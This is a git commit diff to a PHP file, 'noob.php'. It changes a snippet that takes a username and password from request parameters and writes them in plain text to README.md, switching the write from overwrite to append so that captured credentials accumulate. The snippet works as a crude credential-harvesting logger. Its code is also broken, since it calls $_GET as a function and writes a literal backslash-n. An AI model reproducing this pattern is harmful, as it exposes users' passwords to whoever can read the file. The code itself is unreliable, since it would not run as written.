f718851be74c04e2095247cce3872bad156533d9
isnoob <isnoob2015@mt2015.com>
2015-11-24 14:49:14 +0700

    Update noob.php

--- noob.php
+++ noob.php
@@ -2,7 +2,7 @@
 
 	if ($_GET('u') && $_GET('p')) {
 		# code...
-		$file = fopen("README.md","w");
+		$file = fopen("README.md","a");
 		fwrite($file, 'IO <> USER : '.$_GET('u').'--> PW : '.$_GET('p').'\n');
 		fclose($file);
 
